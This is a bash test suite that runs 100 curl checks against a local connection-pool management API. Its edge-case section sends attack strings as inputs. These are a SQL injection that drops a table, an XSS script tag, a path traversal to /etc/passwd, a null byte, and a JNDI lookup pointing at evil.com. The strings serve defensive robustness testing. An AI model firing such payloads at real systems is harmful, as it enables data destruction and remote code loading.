#!/bin/bash
# Comprehensive Connection Pool Testing Script

echo "=========================================="
echo "CONNECTION POOL COMPREHENSIVE TEST REPORT"
echo "=========================================="
echo "Test Date: $(date)"
echo "Server: http://localhost:8080"
echo ""

# Test counter
TEST_NUM=1

# Function to run test
run_test() {
    local test_id=$1
    local description=$2
    local command=$3
    
    echo "----------------------------------------"
    echo "Test $test_id: $description"
    echo "Command: $command"
    echo "Response:"
    response=$(eval "$command" 2>&1)
    echo "$response"
    
    if echo "$response" | grep -q '"error":\|"code":\|<!DOCTYPE\|404\|500\|502\|503'; then
        echo "Status: FAIL"
    elif [ -z "$response" ]; then
        echo "Status: FAIL (Empty response)"
    else
        echo "Status: PASS"
    fi
    echo ""
}

# POOL MANAGEMENT TESTS
echo "========================================"
echo "SECTION 1: POOL MANAGEMENT (Tests POOL-001 to POOL-010)"
echo "========================================"
echo ""

run_test "POOL-001" "List all connection pools" \
    "curl -s -X GET http://localhost:8080/api/v1/pools"

run_test "POOL-002" "Get default pool configuration" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default"

run_test "POOL-003" "Get readonly pool configuration" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/readonly"

run_test "POOL-004" "Get non-existent pool (should fail)" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/nonexistent"

run_test "POOL-005" "Update default pool - increase max connections" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: application/json' -d '{\"pool_id\":\"default\",\"min_connections\":10,\"max_connections\":150,\"connection_timeout_secs\":30,\"idle_timeout_secs\":600,\"max_lifetime_secs\":3600}'"

run_test "POOL-006" "Update default pool - decrease min connections" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: application/json' -d '{\"pool_id\":\"default\",\"min_connections\":5,\"max_connections\":150,\"connection_timeout_secs\":30,\"idle_timeout_secs\":600,\"max_lifetime_secs\":3600}'"

run_test "POOL-007" "Update pool with invalid config (min > max)" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: application/json' -d '{\"pool_id\":\"default\",\"min_connections\":200,\"max_connections\":100,\"connection_timeout_secs\":30,\"idle_timeout_secs\":600,\"max_lifetime_secs\":3600}'"

run_test "POOL-008" "Update pool with zero max connections (invalid)" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: application/json' -d '{\"pool_id\":\"default\",\"min_connections\":10,\"max_connections\":0,\"connection_timeout_secs\":30,\"idle_timeout_secs\":600,\"max_lifetime_secs\":3600}'"

run_test "POOL-009" "Update pool with zero timeout (invalid)" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: application/json' -d '{\"pool_id\":\"default\",\"min_connections\":10,\"max_connections\":100,\"connection_timeout_secs\":0,\"idle_timeout_secs\":600,\"max_lifetime_secs\":3600}'"

run_test "POOL-010" "Update readonly pool configuration" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/readonly -H 'Content-Type: application/json' -d '{\"pool_id\":\"readonly\",\"min_connections\":5,\"max_connections\":75,\"connection_timeout_secs\":15,\"idle_timeout_secs\":300,\"max_lifetime_secs\":1800}'"

echo "========================================"
echo "SECTION 2: POOL STATISTICS (Tests POOL-011 to POOL-020)"
echo "========================================"
echo ""

run_test "POOL-011" "Get default pool statistics" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default/stats"

run_test "POOL-012" "Get readonly pool statistics" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/readonly/stats"

run_test "POOL-013" "Get stats for non-existent pool" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/nonexistent/stats"

run_test "POOL-014" "Verify pool statistics fields" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default/stats | jq 'keys'"

run_test "POOL-015" "Check active connections count" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default/stats | jq '.active_connections'"

run_test "POOL-016" "Check idle connections count" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default/stats | jq '.idle_connections'"

run_test "POOL-017" "Check total connections" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default/stats | jq '.total_connections'"

run_test "POOL-018" "Check waiting requests" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default/stats | jq '.waiting_requests'"

run_test "POOL-019" "Check total acquired count" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default/stats | jq '.total_acquired'"

run_test "POOL-020" "Check pool efficiency metrics" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default/stats | jq '{active: .active_connections, idle: .idle_connections, total: .total_connections}'"

echo "========================================"
echo "SECTION 3: CONNECTION MANAGEMENT (Tests POOL-021 to POOL-035)"
echo "========================================"
echo ""

run_test "POOL-021" "List all active connections" \
    "curl -s -X GET http://localhost:8080/api/v1/connections"

run_test "POOL-022" "List connections with pagination (page 1, size 10)" \
    "curl -s -X GET 'http://localhost:8080/api/v1/connections?page=1&page_size=10'"

run_test "POOL-023" "List connections with pagination (page 2, size 5)" \
    "curl -s -X GET 'http://localhost:8080/api/v1/connections?page=2&page_size=5'"

run_test "POOL-024" "List connections with large page size" \
    "curl -s -X GET 'http://localhost:8080/api/v1/connections?page=1&page_size=100'"

run_test "POOL-025" "List connections with zero page size (should handle)" \
    "curl -s -X GET 'http://localhost:8080/api/v1/connections?page=1&page_size=0'"

run_test "POOL-026" "Get specific connection by ID (ID=1)" \
    "curl -s -X GET http://localhost:8080/api/v1/connections/1"

run_test "POOL-027" "Get non-existent connection (ID=99999)" \
    "curl -s -X GET http://localhost:8080/api/v1/connections/99999"

run_test "POOL-028" "Get connection details with all fields" \
    "curl -s -X GET http://localhost:8080/api/v1/connections/1 | jq 'keys'"

run_test "POOL-029" "Check connection state field" \
    "curl -s -X GET http://localhost:8080/api/v1/connections/1 | jq '.state // \"not_found\"'"

run_test "POOL-030" "Check connection pool_id field" \
    "curl -s -X GET http://localhost:8080/api/v1/connections/1 | jq '.pool_id // \"not_found\"'"

run_test "POOL-031" "Check connection username field" \
    "curl -s -X GET http://localhost:8080/api/v1/connections/1 | jq '.username // \"not_found\"'"

run_test "POOL-032" "Check connection database field" \
    "curl -s -X GET http://localhost:8080/api/v1/connections/1 | jq '.database // \"not_found\"'"

run_test "POOL-033" "Verify connection timestamps" \
    "curl -s -X GET http://localhost:8080/api/v1/connections/1 | jq '{created: .created_at, last_activity: .last_activity}'"

run_test "POOL-034" "Kill connection by ID (ID=99999)" \
    "curl -s -X DELETE http://localhost:8080/api/v1/connections/99999"

run_test "POOL-035" "Verify connection list after kill" \
    "curl -s -X GET http://localhost:8080/api/v1/connections"

echo "========================================"
echo "SECTION 4: SESSION MANAGEMENT (Tests POOL-036 to POOL-050)"
echo "========================================"
echo ""

run_test "POOL-036" "List all sessions" \
    "curl -s -X GET http://localhost:8080/api/v1/sessions"

run_test "POOL-037" "List sessions with pagination (page 1, size 10)" \
    "curl -s -X GET 'http://localhost:8080/api/v1/sessions?page=1&page_size=10'"

run_test "POOL-038" "List sessions with pagination (page 2, size 5)" \
    "curl -s -X GET 'http://localhost:8080/api/v1/sessions?page=2&page_size=5'"

run_test "POOL-039" "Get session by ID (ID=1)" \
    "curl -s -X GET http://localhost:8080/api/v1/sessions/1"

run_test "POOL-040" "Get non-existent session (ID=99999)" \
    "curl -s -X GET http://localhost:8080/api/v1/sessions/99999"

run_test "POOL-041" "Check session fields" \
    "curl -s -X GET http://localhost:8080/api/v1/sessions/1 | jq 'keys // []'"

run_test "POOL-042" "Check session username" \
    "curl -s -X GET http://localhost:8080/api/v1/sessions/1 | jq '.username // \"not_found\"'"

run_test "POOL-043" "Check session state" \
    "curl -s -X GET http://localhost:8080/api/v1/sessions/1 | jq '.state // \"not_found\"'"

run_test "POOL-044" "Check session client_address" \
    "curl -s -X GET http://localhost:8080/api/v1/sessions/1 | jq '.client_address // \"not_found\"'"

run_test "POOL-045" "Terminate session (ID=99999)" \
    "curl -s -X DELETE http://localhost:8080/api/v1/sessions/99999"

run_test "POOL-046" "Verify session list after termination" \
    "curl -s -X GET http://localhost:8080/api/v1/sessions"

run_test "POOL-047" "List sessions with zero page size" \
    "curl -s -X GET 'http://localhost:8080/api/v1/sessions?page=1&page_size=0'"

run_test "POOL-048" "List sessions with negative page" \
    "curl -s -X GET 'http://localhost:8080/api/v1/sessions?page=-1&page_size=10'"

run_test "POOL-049" "Session pagination total count" \
    "curl -s -X GET 'http://localhost:8080/api/v1/sessions?page=1&page_size=10' | jq '.total // 0'"

run_test "POOL-050" "Session pagination has_more field" \
    "curl -s -X GET 'http://localhost:8080/api/v1/sessions?page=1&page_size=5' | jq '.has_more // false'"

echo "========================================"
echo "SECTION 5: POOL LIFECYCLE (Tests POOL-051 to POOL-065)"
echo "========================================"
echo ""

run_test "POOL-051" "Drain default pool" \
    "curl -s -X POST http://localhost:8080/api/v1/pools/default/drain"

run_test "POOL-052" "Verify pool stats after drain" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default/stats"

run_test "POOL-053" "Drain readonly pool" \
    "curl -s -X POST http://localhost:8080/api/v1/pools/readonly/drain"

run_test "POOL-054" "Drain non-existent pool" \
    "curl -s -X POST http://localhost:8080/api/v1/pools/nonexistent/drain"

run_test "POOL-055" "Verify idle connections after drain" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default/stats | jq '.idle_connections'"

run_test "POOL-056" "Double drain same pool" \
    "curl -s -X POST http://localhost:8080/api/v1/pools/default/drain"

run_test "POOL-057" "Check pool recovery after drain" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default/stats | jq '{active: .active_connections, idle: .idle_connections}'"

run_test "POOL-058" "Update pool configuration after drain" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: application/json' -d '{\"pool_id\":\"default\",\"min_connections\":10,\"max_connections\":100,\"connection_timeout_secs\":30,\"idle_timeout_secs\":600,\"max_lifetime_secs\":3600}'"

run_test "POOL-059" "Verify configuration persisted" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default | jq '{min: .min_connections, max: .max_connections}'"

run_test "POOL-060" "Check total_destroyed metric" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default/stats | jq '.total_destroyed'"

run_test "POOL-061" "Pool configuration validation - extreme values" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: application/json' -d '{\"pool_id\":\"default\",\"min_connections\":1,\"max_connections\":10000,\"connection_timeout_secs\":1,\"idle_timeout_secs\":1,\"max_lifetime_secs\":1}'"

run_test "POOL-062" "Restore reasonable pool config" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: application/json' -d '{\"pool_id\":\"default\",\"min_connections\":10,\"max_connections\":100,\"connection_timeout_secs\":30,\"idle_timeout_secs\":600,\"max_lifetime_secs\":3600}'"

run_test "POOL-063" "Check connection lifetime setting" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default | jq '.max_lifetime_secs'"

run_test "POOL-064" "Check idle timeout setting" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default | jq '.idle_timeout_secs'"

run_test "POOL-065" "Final pool health check" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default/stats | jq '{total: .total_connections, active: .active_connections, idle: .idle_connections, created: .total_created, destroyed: .total_destroyed}'"

echo "========================================"
echo "SECTION 6: EDGE CASES & ERROR HANDLING (Tests POOL-066 to POOL-080)"
echo "========================================"
echo ""

run_test "POOL-066" "Invalid HTTP method on pool endpoint" \
    "curl -s -X PATCH http://localhost:8080/api/v1/pools/default"

run_test "POOL-067" "Malformed JSON in pool update" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: application/json' -d '{invalid json}'"

run_test "POOL-068" "Empty JSON body in pool update" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: application/json' -d '{}'"

run_test "POOL-069" "Missing required fields in pool config" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: application/json' -d '{\"pool_id\":\"default\"}'"

run_test "POOL-070" "Negative connection values" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: application/json' -d '{\"pool_id\":\"default\",\"min_connections\":-1,\"max_connections\":-1,\"connection_timeout_secs\":30,\"idle_timeout_secs\":600,\"max_lifetime_secs\":3600}'"

run_test "POOL-071" "Very large page size (potential DOS)" \
    "curl -s -X GET 'http://localhost:8080/api/v1/connections?page=1&page_size=999999'"

run_test "POOL-072" "SQL injection attempt in pool ID" \
    "curl -s -X GET \"http://localhost:8080/api/v1/pools/default'; DROP TABLE users; --\""

run_test "POOL-073" "XSS attempt in pool ID" \
    "curl -s -X GET 'http://localhost:8080/api/v1/pools/<script>alert(1)</script>'"

run_test "POOL-074" "Path traversal attempt" \
    "curl -s -X GET 'http://localhost:8080/api/v1/pools/../../../etc/passwd'"

run_test "POOL-075" "Unicode in pool ID" \
    "curl -s -X GET 'http://localhost:8080/api/v1/pools/测试池'"

run_test "POOL-076" "Very long pool ID" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/$(python3 -c 'print(\"a\"*10000)')"

run_test "POOL-077" "Null bytes in request" \
    "curl -s -X GET 'http://localhost:8080/api/v1/pools/test%00null'"

run_test "POOL-078" "Invalid content-type header" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: text/plain' -d 'not json'"

run_test "POOL-079" "Missing content-type header" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/default -d '{\"pool_id\":\"default\",\"min_connections\":10,\"max_connections\":100,\"connection_timeout_secs\":30,\"idle_timeout_secs\":600,\"max_lifetime_secs\":3600}'"

run_test "POOL-080" "Request with invalid characters" \
    "curl -s -X GET 'http://localhost:8080/api/v1/pools/\$\{jndi:ldap://evil.com\}'"

echo "========================================"
echo "SECTION 7: CONCURRENT OPERATIONS (Tests POOL-081 to POOL-095)"
echo "========================================"
echo ""

run_test "POOL-081" "Concurrent pool reads (5 simultaneous)" \
    "for i in {1..5}; do curl -s -X GET http://localhost:8080/api/v1/pools/default & done; wait"

run_test "POOL-082" "Concurrent stats requests" \
    "for i in {1..5}; do curl -s -X GET http://localhost:8080/api/v1/pools/default/stats & done; wait"

run_test "POOL-083" "Concurrent connection listings" \
    "for i in {1..5}; do curl -s -X GET http://localhost:8080/api/v1/connections & done; wait"

run_test "POOL-084" "Concurrent session listings" \
    "for i in {1..5}; do curl -s -X GET http://localhost:8080/api/v1/sessions & done; wait"

run_test "POOL-085" "Mixed read operations" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default & curl -s -X GET http://localhost:8080/api/v1/pools/readonly & curl -s -X GET http://localhost:8080/api/v1/connections & wait"

run_test "POOL-086" "Rapid pool configuration changes" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: application/json' -d '{\"pool_id\":\"default\",\"min_connections\":15,\"max_connections\":100,\"connection_timeout_secs\":30,\"idle_timeout_secs\":600,\"max_lifetime_secs\":3600}'; curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: application/json' -d '{\"pool_id\":\"default\",\"min_connections\":10,\"max_connections\":100,\"connection_timeout_secs\":30,\"idle_timeout_secs\":600,\"max_lifetime_secs\":3600}'"

run_test "POOL-087" "Read after write consistency" \
    "curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: application/json' -d '{\"pool_id\":\"default\",\"min_connections\":12,\"max_connections\":100,\"connection_timeout_secs\":30,\"idle_timeout_secs\":600,\"max_lifetime_secs\":3600}' && curl -s -X GET http://localhost:8080/api/v1/pools/default | jq '.min_connections'"

run_test "POOL-088" "Multiple drain operations" \
    "curl -s -X POST http://localhost:8080/api/v1/pools/default/drain & curl -s -X POST http://localhost:8080/api/v1/pools/default/drain & wait"

run_test "POOL-089" "Drain and stats check" \
    "curl -s -X POST http://localhost:8080/api/v1/pools/default/drain && sleep 1 && curl -s -X GET http://localhost:8080/api/v1/pools/default/stats"

run_test "POOL-090" "Stress test - 10 rapid requests" \
    "for i in {1..10}; do curl -s -X GET http://localhost:8080/api/v1/pools/default/stats & done; wait"

run_test "POOL-091" "Mixed operations concurrency" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default & curl -s -X GET http://localhost:8080/api/v1/pools/default/stats & curl -s -X GET http://localhost:8080/api/v1/connections & curl -s -X GET http://localhost:8080/api/v1/sessions & wait"

run_test "POOL-092" "Pagination stress test" \
    "for i in {1..5}; do curl -s -X GET 'http://localhost:8080/api/v1/connections?page='$i'&page_size=10' & done; wait"

run_test "POOL-093" "Pool list with concurrent updates" \
    "curl -s -X GET http://localhost:8080/api/v1/pools & curl -s -X PUT http://localhost:8080/api/v1/pools/default -H 'Content-Type: application/json' -d '{\"pool_id\":\"default\",\"min_connections\":10,\"max_connections\":100,\"connection_timeout_secs\":30,\"idle_timeout_secs\":600,\"max_lifetime_secs\":3600}' & wait"

run_test "POOL-094" "High frequency stats polling" \
    "for i in {1..20}; do curl -s -X GET http://localhost:8080/api/v1/pools/default/stats > /dev/null & done; wait; curl -s -X GET http://localhost:8080/api/v1/pools/default/stats"

run_test "POOL-095" "Concurrent different pool operations" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default/stats & curl -s -X GET http://localhost:8080/api/v1/pools/readonly/stats & wait"

echo "========================================"
echo "SECTION 8: INTEGRATION & FINAL CHECKS (Tests POOL-096 to POOL-100)"
echo "========================================"
echo ""

run_test "POOL-096" "Verify all pools still accessible" \
    "curl -s -X GET http://localhost:8080/api/v1/pools | jq 'length'"

run_test "POOL-097" "Verify pool configurations intact" \
    "curl -s -X GET http://localhost:8080/api/v1/pools | jq '.[] | {pool_id, min_connections, max_connections}'"

run_test "POOL-098" "Final statistics snapshot - default pool" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/default/stats | jq '{pool_id, active: .active_connections, idle: .idle_connections, total: .total_connections, acquired: .total_acquired, created: .total_created, destroyed: .total_destroyed}'"

run_test "POOL-099" "Final statistics snapshot - readonly pool" \
    "curl -s -X GET http://localhost:8080/api/v1/pools/readonly/stats | jq '{pool_id, active: .active_connections, idle: .idle_connections, total: .total_connections}'"

run_test "POOL-100" "Final health check - all endpoints responsive" \
    "curl -s -X GET http://localhost:8080/api/v1/pools && curl -s -X GET http://localhost:8080/api/v1/connections && curl -s -X GET http://localhost:8080/api/v1/sessions"

echo ""
echo "=========================================="
echo "TEST SUITE COMPLETED"
echo "=========================================="
echo "Total Tests: 100"
echo "Test Coverage:"
echo "  - Pool Management: Tests 1-10"
echo "  - Pool Statistics: Tests 11-20"
echo "  - Connection Management: Tests 21-35"
echo "  - Session Management: Tests 36-50"
echo "  - Pool Lifecycle: Tests 51-65"
echo "  - Edge Cases: Tests 66-80"
echo "  - Concurrent Operations: Tests 81-95"
echo "  - Integration: Tests 96-100"
echo "=========================================="
